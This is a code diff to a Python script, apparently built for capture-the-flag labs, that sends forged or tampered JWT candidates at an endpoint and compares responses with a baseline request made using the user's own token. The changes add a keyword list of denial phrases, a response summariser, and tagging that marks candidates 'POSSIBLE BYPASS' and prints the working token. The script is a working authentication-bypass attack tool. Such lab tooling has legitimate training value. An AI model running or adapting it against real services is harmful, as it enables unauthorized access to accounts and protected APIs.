@@ -44,6 +44,32 @@ def demangle(p):
     return norm if norm.startswith("/") else "/" + norm
 
 
+DENY_HINTS = ("unauthorized", "forbidden", "access denied", "invalid token", "invalid signature",
+              "expired token", "not authorized", "permission denied", "authentication required",
+              "must be logged in", "invalid or expired", "jwt malformed", "jwt expired",
+              "no token provided", "token required", "missing authorization")
+
+def looks_denial(status, text):
+    """A 401/403 is always a denial; otherwise fall back to the body language —
+    status codes get jittered on some labs, the wording usually doesn't."""
+    if status in (401, 403):
+        return True
+    body = (text or "")[:300].lower()
+    return any(h in body for h in DENY_HINTS)
+
+def short_summary(r):
+    """A parsed error/message/detail/code beats a raw body dump for scanning
+    twenty candidates at a glance."""
+    try:
+        j = r.json()
+        if isinstance(j, dict):
+            for k in ("error", "message", "detail", "code"):
+                if k in j and isinstance(j[k], (str, int, float, bool)):
+                    return f"{k}={str(j[k])[:80]}"
+    except Exception:
+        pass
+    return re.sub(r"\s+", " ", (r.text or "")).strip()[:80]
+
 b64e = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=")
 def b64d(s):
     s = s + "=" * (-len(s) % 4)
@@ -130,7 +156,9 @@ def main():
 
     url = a.base.rstrip("/") + demangle(a.test)
     base_r = requests.get(url, headers={"Authorization": "Bearer " + a.token}, verify=False)
-    print(f"\n[*] baseline with your own token: {base_r.status_code} ({len(base_r.content)}b)")
+    base_denied = looks_denial(base_r.status_code, base_r.text)
+    print(f"\n[*] baseline with your own token: {base_r.status_code} ({len(base_r.content)}b) "
+          f"[{'denied' if base_denied else 'NOT denied'}] {short_summary(base_r)}")
     print(f"[*] firing {len(cands)} candidates at {url}\n")
     for name, t in cands:
         try:
@@ -138,13 +166,26 @@ def main():
         except Exception as e:
             print(f"  {name:22s} ERR {e}"); continue
         flags = set(FLAG.findall(r.text)) | {m for k, v in r.headers.items() for m in FLAG.findall(v)}
-        win = "  <-- CHANGED" if (r.status_code != base_r.status_code or len(r.content) != len(base_r.content)) else ""
-        print(f"  {name:22s} {r.status_code} ({len(r.content)}b){win}")
+        cur_denied = looks_denial(r.status_code, r.text)
+        if flags:
+            # a flag is unconditional success regardless of status/body class
+            tag = "FLAG"
+        elif cur_denied:
+            # still reaches a denial — a reworded rejection is not progress
+            tag = "rejected"
+        elif base_denied:
+            # the baseline denial is gone: this is the interesting case
+            tag = "POSSIBLE BYPASS"
+        else:
+            tag = "unchanged"
+        print(f"  {name:22s} {r.status_code} ({len(r.content)}b) [{tag}] {short_summary(r)}")
         for k, v in r.headers.items():
             if "flag" in k.lower():
                 print(f"      HDR {k}: {v}")
         if flags:
             print(f"      FLAG {flags}")
+            print(f"      TOKEN {t}")
+        elif tag == "POSSIBLE BYPASS":
             print(f"      TOKEN {t}")
 
 if __name__ == "__main__":
